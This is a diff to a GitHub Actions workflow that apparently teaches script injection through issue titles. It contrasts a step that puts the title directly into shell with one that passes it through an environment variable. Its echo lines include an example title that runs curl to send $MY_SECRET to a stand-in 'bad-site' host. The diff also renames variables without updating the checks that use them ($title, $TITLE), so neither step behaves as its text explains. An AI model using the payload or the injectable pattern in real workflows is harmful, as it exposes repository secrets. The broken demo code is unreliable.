@@ -16,7 +16,7 @@ jobs:
           echo The workflow starts on Open/Reopen an issue 
           echo We can name the issue, e.g.':' 'a";echo !!! I have bugexecuted a script !!!"'
           echo As a result, the echo command script can be unintentionally executed
-          echo One of the jobs is protected, the other is not.
+          echo One of the jobs is protected, the other is not.  
           echo ---
   assign-label:
     runs-on: ubuntu-latest
@@ -27,9 +27,10 @@ jobs:
           echo Here we insert title directly to shell command
           echo As a result, the \'echo\' text is considered as a command and executed
           echo "(and btw issue WILL NOT be identified as bug - because" \'bugexecuted\' "is in another command)" 
-          echo Now imagine if the issue name was':' 'a"; curl http://bad-site/steal-password/$MY_SECRET'
+          echo Now imagine if the issue name was':' 'a"; curl http://bad-site/steal-secret/$MY_SECRET'
           echo ---
-          title="${{github.event.issue.title}}"
+          TITLE="${{github.event.issue.title}}"
+          echo "Issue title = $TITLE"
           if [[ "$title" == *"bug"* ]]; 
           then
             echo "Issue is a bug"
@@ -38,7 +39,7 @@ jobs:
           fi
       - name: Protected step - setting title as environment variable first
         env:
-          TITLE: ${{github.event.issue.title}}
+          ISSUE_TITLE: ${{github.event.issue.title}}
         run: |
           echo ---
           echo Here we first set title as environment variable
@@ -46,6 +47,7 @@ jobs:
           echo Now the script in the title will not be executed
           echo "(and the issue WILL be identified as bug because" \'bugexecuted\' "is also a part of the title)"
           echo ---
+          echo "Issue title = $ISSUE_TITLE"
           if [[ "$TITLE" == *"bug"* ]]; 
           then
             echo "Issue is a bug"
